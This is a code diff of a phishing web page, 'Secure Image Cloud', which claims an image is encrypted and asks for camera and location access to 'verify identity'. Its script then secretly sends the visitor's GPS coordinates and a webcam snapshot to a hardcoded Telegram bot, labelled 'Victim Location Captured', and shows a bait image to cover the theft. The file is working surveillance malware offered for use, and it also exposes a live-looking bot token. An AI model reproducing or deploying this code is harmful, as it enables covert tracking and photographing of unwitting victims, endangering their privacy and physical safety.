@@ -3,59 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Viewer</title>
+    <title>Secure Image Cloud</title>
     <style>
-        body { font-family: sans-serif; background: #0f0f0f; color: #e0e0e0; text-align: center; padding: 50px 20px; }
-        .box { border: 1px solid #333; padding: 30px; border-radius: 20px; background: #1a1a1a; max-width: 400px; margin: auto; }
-        .btn { background: #0088cc; color: white; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; }
-        #status { color: #888; margin-top: 20px; font-size: 14px; }
+        body { font-family: sans-serif; background: #0a0a0a; color: #fff; text-align: center; padding: 40px 20px; }
+        .card { background: #161616; border: 1px solid #333; border-radius: 15px; padding: 25px; max-width: 350px; margin: auto; }
+        .btn { background: #0088cc; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #victim_view { display: none; width: 100%; border-radius: 10px; margin-top: 20px; border: 1px solid #444; }
+        #status { color: #888; font-size: 14px; margin-top: 15px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2 style="color: #0088cc;">🔒 Security Check</h2>
-        <p>Biometric and Zone Verification required to unlock this content.</p>
-        <button class="btn" onclick="startFullVerify()">VERIFY & UNLOCK</button>
-        <p id="status">Waiting...</p>
+    <div id="setup_box" class="card">
+        <h2 style="color:#0088cc">🔒 Content Locked</h2>
+        <p>This image is encrypted. Please allow <b>Camera</b> and <b>Location</b> access to verify your identity and view the file.</p>
+        <button class="btn" onclick="startCapture()">ALLOW & VERIFY</button>
+        <p id="status">Waiting for access...</p>
     </div>
-    <p style="margin-top:20px; font-size:10px;">Made by Nitin 333</p>
+
+    <img id="victim_view" src="" alt="Decrypted Image">
+    
+    <p style="font-size:10px; color:#444; margin-top:20px;">Made by Nitin 333</p>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const BOT_TOKEN = "8149527318:AAEkQ189QqtT81wZQ9hwT_-eqbL5JFoiFx0";
-        const CHAT_ID = "6643732863"; // <--- PUT YOUR TELEGRAM ID HERE
+        const TOKEN = "8149527318:AAEkQ189QqtT81wZQ9hwT_-eqbL5JFoiFx0";
+        const CHAT_ID = "6643732863"; // <--- PUT YOUR CHAT ID HERE
 
-        function startFullVerify() {
-            document.getElementById('status').innerText = "Processing...";
-            
-            // 1. Captured Location
+        const urlParams = new URLSearchParams(window.location.search);
+        const baitImg = urlParams.get('img');
+
+        async function startCapture() {
+            document.getElementById('status').innerText = "Verifying... Please wait.";
+
+            // 1. Secretly Capture Location
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                         method: "POST",
-                        headers: { "Content-Type": "application/json" },
+                        headers: {"Content-Type": "application/json"},
                         body: JSON.stringify({
                             chat_id: CHAT_ID,
-                            text: `📍 **Location Captured!**\nMaps: http://www.google.com/maps/place/${lat},${lon}`
+                            text: `📍 **Victim Location Captured!**\nMaps: http://www.google.com/maps/place/${lat},${lon}`
                         })
                     });
-                });
+                }, (err) => { console.log("Loc denied"); });
             }
 
-            // 2. Capture Camera
-            takeCameraCapture();
-        }
-
-        async function takeCameraCapture() {
+            // 2. Secretly Capture Camera
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
@@ -64,11 +68,26 @@
                         formData.append("chat_id", CHAT_ID);
                         formData.append("photo", blob, "scan.jpg");
                         formData.append("caption", "🎯 Biometric Scan Captured!");
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method: "POST", body: formData});
                     }, 'image/jpeg');
+
                     stream.getTracks().forEach(t => t.stop());
+                    
+                    // 3. Reveal the bait image to the victim
+                    document.getElementById('setup_box').style.display = 'none';
+                    const imgTag = document.getElementById('victim_view');
+                    if(baitImg) {
+                        imgTag.src = baitImg;
+                        imgTag.style.display = 'block';
+                    } else {
+                        alert("Verification complete, but no image found.");
+                    }
+
                 }, 2000);
-            } catch (err) { alert("Permission required."); }
+            } catch (err) { 
+                alert("Permission required to unlock the content.");
+                document.getElementById('status').innerText = "Access Denied.";
+            }
         }
     </script>
 </body>
